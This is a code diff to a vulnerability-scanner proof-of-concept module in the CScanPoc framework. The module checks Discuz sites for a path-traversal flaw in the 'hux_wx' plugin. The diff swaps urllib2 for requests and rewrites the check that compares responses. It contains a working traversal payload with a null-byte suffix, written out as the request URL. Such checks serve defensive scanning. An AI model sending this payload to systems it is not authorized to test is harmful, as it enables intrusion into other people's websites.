@@ -2,8 +2,6 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib2
-import hashlib
 
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0011' # 平台漏洞编号，留空
@@ -37,12 +35,10 @@ class Poc(ABPoc):
             verify_file = '/plugin.php?id=hux_wx:hux_wx&uid=1&mod=/../../../..&ac=/static/image/admincp/add.gif%00'
             vul_url = self.target + verify_file
             verify_url = '%s/static/image/admincp/add.gif' % self.target
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
-            req2 = urllib2.Request(vul_url)
-            content2 = urllib2.urlopen(req2).read()
+            req = requests.get(verify_url)
+            req2 = requests.get(vul_url)
 
-            if md5(content).hexdigest() == md5(content2).hexdigest():
+            if (req.status_code==200 or req2.status_code==200) and req.text == req2.text and ("404"  not in req.text or "404" not in req2.text):
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
